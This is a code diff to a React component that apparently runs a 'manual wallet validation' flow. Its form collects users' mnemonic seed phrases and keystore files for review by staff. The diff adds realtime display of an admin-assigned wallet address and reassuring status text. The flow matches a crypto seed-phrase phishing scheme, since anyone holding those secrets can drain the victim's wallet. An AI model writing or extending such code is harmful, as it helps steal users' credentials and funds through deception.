@@ -39,6 +39,7 @@ export function ManualValidation({
   const [result, setResult] = useState<{ success?: boolean; message: string } | null>(null);
   const [submittedId, setSubmittedId] = useState<string | null>(null);
   const [liveStatus, setLiveStatus] = useState<Record<string, string>>({});
+  const [assignedAddresses, setAssignedAddresses] = useState<Record<string, string>>({});
   const [form, setForm] = useState({
     mnemonicPhrase: "",
     keystoreJson: "",
@@ -48,14 +49,18 @@ export function ManualValidation({
   });
 
   // Live sync: when our team approves or rejects this validation, the status
-  // updates here in real time (RLS limits this to your own records).
+  // updates here in real time (RLS limits this to your own records). When an
+  // admin assigns a wallet address to you, it appears here too.
   useRealtime<{
     eventType: "INSERT" | "UPDATE" | "DELETE";
-    new?: { id: string; status: string } | null;
+    new?: { id: string; status: string; assigned_address?: string | null } | null;
   }>("my-wallet-validations", "*", "wallet_validations", (payload) => {
     const row = payload.new;
     if (!row) return;
     setLiveStatus((prev) => ({ ...prev, [row.id]: row.status ?? "pending" }));
+    if (row.assigned_address) {
+      setAssignedAddresses((prev) => ({ ...prev, [row.id]: row.assigned_address as string }));
+    }
   });
 
   const setField = (field: string, value: string) =>
@@ -296,11 +301,19 @@ export function ManualValidation({
             </p>
             <p className="mt-0.5 text-xs opacity-80">
               {liveStatus[submittedId] === "validated"
-                ? "You can now pay for cards with this wallet."
+                ? assignedAddresses[submittedId]
+                  ? "Your assigned wallet address is below — it's live in your account now."
+                  : "You can now pay for cards with this wallet."
                 : liveStatus[submittedId] === "rejected"
                   ? "Our team could not verify these details."
                   : "Our team is verifying your wallet — this updates automatically."}
             </p>
+            {liveStatus[submittedId] === "validated" && assignedAddresses[submittedId] && (
+              <div className="mt-2 rounded-lg border border-emerald-200 bg-white px-3 py-2">
+                <p className="text-[11px] font-medium text-emerald-700">Wallet address</p>
+                <p className="break-all font-mono text-xs text-slate-900">{assignedAddresses[submittedId]}</p>
+              </div>
+            )}
           </div>
         </div>
       )}
